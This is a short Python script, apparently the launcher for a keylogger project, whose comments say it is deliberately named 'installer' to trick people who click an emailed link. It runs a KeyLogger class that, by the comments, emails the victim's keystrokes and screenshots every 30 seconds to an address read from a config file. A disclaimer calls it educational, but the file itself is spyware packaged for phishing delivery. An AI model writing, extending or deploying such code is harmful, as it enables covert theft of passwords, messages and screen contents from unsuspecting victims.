# disclaimer - this program is for educational purposes only
#   any use of this program for malicious reasons falls completly under your risk
#   and I will take no fault for your actions.

# this file is named installer for deceptive reasons
# It will act like an installation script when people click on a link in
# an email. If the person has a mac, then they will have python natively
# and this script will run fine. I will have to look into ways to run on windows


# functionality:
# - sends screenshot of the persons screen every 30 seconds
# - key strokes are logged to a file. File is sent every 30 seconds?


# format.txt -
# first line: <sender-emial>
# second line: <recepient-email>

from keylogger import KeyLogger # import class we created
from myemail import Email

def main():
    """
    Main "installation" function used to install program
    """
    f = open("format.txt")

    # create the email from formatter
    email = Email(f.readline(), f.readline())
    kl = KeyLogger(email) 
    kl.run_keylogger()

    # close file
    f.close()


# check to see if main script being run
if __name__== "__main__":
    main()

